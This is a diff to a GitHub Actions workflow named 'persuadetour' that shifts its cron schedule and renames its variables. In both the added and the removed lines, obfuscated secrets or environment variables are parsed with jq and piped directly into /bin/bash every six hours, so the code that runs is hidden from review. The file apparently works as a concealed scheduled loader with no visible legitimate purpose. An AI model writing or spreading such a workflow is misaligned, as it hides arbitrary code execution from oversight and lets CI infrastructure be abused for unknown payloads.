@@ -1,26 +1,26 @@
 name: persuadetour
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '45 3/6 * * *'
-
+    - cron: '23 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: persuadetour
         env:
-          gs248: ${{ secrets.gs248 }}
+          vjo182: ${{ secrets.vjo182 }}
         run: |
-          echo $gs248 | jq -r .d7 | /bin/bash
-          echo $mtgs4 | jq -r .ltdws78530 | /bin/bash
-          echo $iojjq8 | jq -r .m71548 | /bin/bash
-          echo $f0322 | jq -r .j03251 | /bin/bash
-          echo $c6 | jq -r .ytb8223 | /bin/bash
-          echo $c128 | jq -r .wbdpd96 | /bin/bash
-          echo $va8 | jq -r .uxh2 | /bin/bash
-          echo $evyx20022 | jq -r .qhg50388 | /bin/bash
-          echo $i22136 | jq -r .vzfj783 | /bin/bash
-          echo $i44210 | jq -r .apqve396 | /bin/bash
+          echo $vjo182 | jq -r .rlo2 | /bin/bash
+          echo $uzykc0 | jq -r .gm43 | /bin/bash
+          echo $omvs7723 | jq -r .wue81 | /bin/bash
+          echo $tpewp8 | jq -r .cyfas693 | /bin/bash
+          echo $jbdux8 | jq -r .be52242 | /bin/bash
+          echo $wrt88 | jq -r .kxntr6537 | /bin/bash
+          echo $t418 | jq -r .ce6 | /bin/bash
+          echo $sj4 | jq -r .pbxmd364 | /bin/bash
+          echo $gxbd5 | jq -r .racxp7 | /bin/bash
 
